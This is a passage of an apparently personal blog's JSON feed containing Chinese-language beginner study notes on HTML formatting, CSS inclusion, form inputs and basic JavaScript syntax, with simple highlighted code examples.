class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>arial<span class=\"token punctuation\">;</span><span class=\"token property\">color</span><span class=\"token punctuation\">:</span>red<span class=\"token punctuation\">;</span><span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span>20px<span class=\"token punctuation\">;</span><span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span>center<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span>A paragraph.<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//设置字体，字体颜色，字体大小,水平对齐方式</pre></td></tr></table></figure><h6 id=\"2文本格式化\"><a class=\"anchor\" href=\"#2文本格式化\">#</a> 2. 文本格式化</h6>\n<p><strong>一般操作：</strong></p>\n<p>&lt;b&gt;/&lt;strong&gt;：加粗</p>\n<p>&lt;big&gt;：加大</p>\n<p>&lt;small&gt;：缩小</p>\n<p>&lt;em&gt;/&lt;i&gt;：强调（斜体）</p>\n<p>&lt;sub&gt;/&lt;sup&gt;：下标 / 上标</p>\n<hr />\n<p><strong>用于计算机输入输出：</strong></p>\n<p>&lt;code&gt;：代码</p>\n<p>&lt;kbd&gt;：键盘输入</p>\n<p>&lt;samp&gt;：例子</p>\n<p>&lt;var&gt;：变量</p>\n<hr />\n<p><strong>？：</strong></p>\n<p><strong>&lt;address&gt;：</strong> 该元素定义文档或文章的联系信息（作者 / 拥有者）。</p>\n<p>**&lt;cite&gt;：** 定义著作标题，默认斜体，需要 &lt; p&gt;</p>\n<p>**&lt;acronmy title=&quot;wo wo wo&quot;&gt;www&lt;acronym&gt;：** 首字母缩写</p>\n<p>#鼠标移上去显示完整</p>\n<blockquote>\n<p><strong>不同于 &lt;addr&gt;, 这个不能定义其它缩写，但是不用 &lt; p&gt;</strong>(&lt;addr&gt; 的用法也可用于<a href=\"%E5%AE%9A%E4%B9%89%E9%A1%B9%E7%9B%AE%E6%88%96%E8%80%85%E7%BC%A9%E7%95%A5%E8%AF%8D%E7%94%A8\"> &lt;dfn&gt;</a>，不给参数的 &lt;dfn&gt; 当作没有，但不会错)</p>\n</blockquote>\n<p><strong>&lt;bdo dir=&quot;rtl&quot;&gt;</strong>： 即 bi-directional override</p>\n<p>#需要浏览器支持，rtl 实际上是 right to left, 这会是下面内容的实际输出顺序</p>\n<p>**&lt;blockquote&gt;/&lt;q&gt;：** 长引用 / 短引用，<strong>前者自带换行，边距，缩进</strong>。后者没有。</p>\n<p>#blockquote 可以跟参数，但是没什么用，一般是被引用内容的网址</p>\n<p>**&lt;del&gt;：** 删除文本（其实就是中间划线）</p>\n<p>**&lt;ins&gt;：** 下划线 3.</p>\n<p>#老旧浏览器可能不支持 del 和 ins, 只会普通显示</p>\n<h6 id=\"3颜色\"><a class=\"anchor\" href=\"#3颜色\">#</a> 3. 颜色</h6>\n<p>命名的有：</p>\n<p>aqua, black, blue, fuchsia, gray, green, lime, maroon, navy, olive, purple, red, silver, teal, white, yellow</p>\n<p>// 就这 16 个</p>\n<p>其他写成：</p>\n<p>#00FF00   // 十六进制，相当于 rgb (0,255,0), 按顺序看，这其实就是绿色</p>\n<h6 id=\"4css的调用\"><a class=\"anchor\" href=\"#4css的调用\">#</a> 4.css (的调用)</h6>\n<p>&lt;head&gt;<br />\n&lt;style type=&quot;text/css&quot;&gt;<br />\nh1 {color: red}<br />\np {color: blue}<br />\n&lt;/style&gt;<br />\n&lt;/head&gt;</p>\n<p>&lt;head&gt;<br />\n&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/html/csstest1.css&quot; &gt;<br />\n&lt;/head&gt;</p>\n<p>//<strong> 外部样式表</strong>和<strong>内部样式表</strong>都在 head 里放前面，只有内联样式在 body 里</p>\n<p>外部样式表会改变所有页面，内部可以指定特定，内联则只有个别元素</p>\n<p><strong>外部用 link</strong></p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/css<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>mystyle.css<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><strong>内部和内联用 style</strong></p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/css<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token selector\">body</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span> red<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token selector\">p</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">margin-left</span><span class=\"token punctuation\">:</span> 20px<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">color</span><span class=\"token punctuation\">:</span> red<span class=\"token punctuation\">;</span> <span class=\"token property\">margin-left</span><span class=\"token punctuation\">:</span> 20px</span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>This is a paragraph</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><hr />\n<h4 id=\"3表单\"><a class=\"anchor\" href=\"#3表单\">#</a> 3. 表单</h4>\n<p>表单元素指的是不同类型的 input 元素、复选框、单选按钮、提交按钮等等。</p>\n<p>这是本章中使用的类型：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">类型</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">text</td>\n<td style=\"text-align:left\">定义常规文本输入。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">radio</td>\n<td style=\"text-align:left\">定义单选按钮输入（选择多个选择之一）</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">submit</td>\n<td style=\"text-align:left\">定义提交按钮（提交表单）// 需要 action 属性，省略会变成当前页                                      面</td>\n</tr>\n</tbody>\n</table>\n<p>例如：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> First name:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>firstname<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span> //name属性的值就是被你所输入的</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>                                  文本赋值的变量</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> Last name:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>lastname<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>//文本默认宽度只有20</pre></td></tr></table></figure><p>以及</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>radio<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>sex<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>male<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">checked</span><span class=\"token punctuation\">></span></span>Male</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>//checked表示被选中</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>radio<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>sex<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>female<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Female</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>还有</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>action_page.php<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>First name:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>firstname<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Mickey<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Last name:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>lastname<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Mouse<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>可以使用 min 和 max 属性限制输入值的范围</p>\n<h2 id=\"题外话\"><a class=\"anchor\" href=\"#题外话\">#</a> 题外话：</h2>\n<p>这个 head 疑似是用来添加请求头参数的，存在：</p>\n<p>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot; /&gt;<br />\n&lt;meta http-equiv=&quot;Content-Language&quot; content=&quot;zh-cn&quot; /&gt;<br />\n 语句</p>\n<hr />\n<p>&lt;p id=&quot;js_and_id&quot;&gt;HTML JavaScript&lt;/p&gt;</p>\n",
            "tags": [
                "技术"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2024/10/14/JavaScript/",
            "url": "https://zhewanyiershinicheng.github.io/2024/10/14/JavaScript/",
            "title": "JavaScript",
            "date_published": "2024-10-14T05:21:05.000Z",
            "content_html": "<h1 id=\"js\"><a class=\"anchor\" href=\"#js\">#</a> JS</h1>\n<h3 id=\"i显示数据\"><a class=\"anchor\" href=\"#i显示数据\">#</a> Ⅰ. 显示数据</h3>\n<ul>\n<li>使用 <strong>window.alert()</strong> 弹出警告框。</li>\n<li>使用 <strong>document.write()</strong> 方法将内容写到 HTML 文档中。</li>\n<li>使用 <strong>innerHTML</strong> 写入到 HTML 元素。</li>\n<li>使用 <strong>console.log()</strong> 写入到浏览器的控制台。</li>\n</ul>\n<h4 id=\"1windowalert\"><a class=\"anchor\" href=\"#1windowalert\">#</a> 1.window.alert()</h4>\n<p>这之中可以进行运算，如果输出不是字符，可以不要”“</p>\n<p>操作 HTML 元素</p>\n<p>如需从 JavaScript 访问某个 HTML 元素，您可以使用 document.getElementById (<em>id</em>) 方法。</p>\n<p>请使用 &quot;id&quot; 属性来标识 HTML 元素，并 innerHTML 来获取或插入元素内容：</p>\n<p>例如：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">></span></span>我的第一个 Web 页面<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>demo<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>我的第一个段落<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span> //使用标签来获取</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"demo\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token string\">\"段落已修改。\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span>         //注意这是一个覆盖操作，js对大小写很敏感</pre></td></tr></table></figure><h4 id=\"2documentwrite\"><a class=\"anchor\" href=\"#2documentwrite\">#</a> 2.document.write()</h4>\n<p>如果在文档已完成加载后执行 document.write，整个 HTML 页面将被覆盖</p>\n<blockquote>\n<p>网页加载后输出流就已经停止，重新调用 document.write () 就会发生覆盖，</p>\n<p>事实上 write 方法会隐性调用 open 方法写一个新的文档（所以要加标签），如果强制使用 close 方法，会直接输出所有缓存的输出内容，理论上一旦调用了 close 方法，就不能在用 write，这样也会覆盖</p>\n</blockquote>\n<h4 id=\"3consolelog\"><a class=\"anchor\" href=\"#3consolelog\">#</a> 3.console.log()</h4>\n<p>其中为输出的变量，这是写在控制台用于调试（F12），不会出现在网页上</p>\n<h3 id=\"ii语法\"><a class=\"anchor\" href=\"#ii语法\">#</a> Ⅱ. 语法</h3>\n<p>// 注释方法同 C 语言</p>\n<h4 id=\"1字面量\"><a class=\"anchor\" href=\"#1字面量\">#</a> 1. 字面量</h4>\n<h5 id=\"数字number\"><a class=\"anchor\" href=\"#数字number\">#</a> 数字（Number）</h5>\n<p>可以是整数或者是小数，或者是科学计数 (e)，输出时不会使用科学计数法</p>\n<h5 id=\"字符串string\"><a class=\"anchor\" href=\"#字符串string\">#</a> 字符串（String）</h5>\n<p>可以使用单引号或双引号:</p>\n<h5 id=\"表达式\"><a class=\"anchor\" href=\"#表达式\">#</a> 表达式</h5>\n<p>用于计算： 比如 1/1</p>\n<h5 id=\"数组array\"><a class=\"anchor\" href=\"#数组array\">#</a> 数组（Array）</h5>\n<p>定义一个数组：[]</p>\n<p>定义方法：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> cars<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>cars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">\"Saab\"</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 数组的寻址从 0 开始，可以创建空数组</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>cars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">\"Volvo\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>cars<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">\"BMW\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 或者</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">var</span> cars<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Array</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Saab\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Volvo\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"BMW\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 再或者</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">var</span> cars<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Array</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Saab\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Volvo\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"BMW\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 最简单的</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">var</span> cars<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"Saab\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Volvo\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"BMW\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>注意：typeof 不能区分数组和对象，都会输出对象，要用：</p>\n<pre><code>if(car instanceof Array)&#123;\ndocument.write(&quot;是数组&quot;)\n&#125;\n</code></pre>\n<p><strong>对象（Object）字面量</strong></p>\n<p firstName:John,=\"\" lastName:Doe,=\"\" age:50,=\"\" eyeColor:blue=\"\">定义一个对象：</p>\n<p>定义方法：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> person<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">firstname</span><span class=\"token operator\">:</span><span class=\"token string\">\"John\"</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">lastname</span><span class=\"token operator\">:</span><span class=\"token string\">\"Doe\"</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">id</span><span class=\"token operator\">:</span><span class=\"token number\">5566</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 或者</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">var</span> person<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token literal-property property\">firstname</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"John\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token literal-property property\">lastname</span>  <span class=\"token operator\">:</span> <span class=\"token string\">\"Doe\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token literal-property property\">id</span>        <span class=\"token operator\">:</span>  <span class=\"token number\">5566</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// 其实就是无所谓折行</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 或者</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">var</span> people <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>people<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string\">'Tom'</span><span class=\"token punctuation\">;</span>   </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>people<span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> <span class=\"token number\">21</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>people<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">eat</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token punctuation\">&#125;</span> <span class=\"token comment\">// 追加属性和方法</span></pre></td></tr></table></figure><p>寻址方式：</p>\n<pre><code>name=person.lastname;\nname=person[&quot;lastname&quot;];\n</code></pre>\n<h5 id=\"函数function\"><a class=\"anchor\" href=\"#函数function\">#</a> 函数（Function）</h5>\n<p return=\"\" a=\"\" *=\"\" b;=\"\">定义一个函数： function myFunction (a, b)</p>\n<p>带参数的变量使用：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>点击这个按钮，来调用带参数的函数。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token special-attr\"><span class=\"token attr-name\">onclick</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">myFunction</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Harry Potter'</span><span class=\"token punctuation\">,</span><span 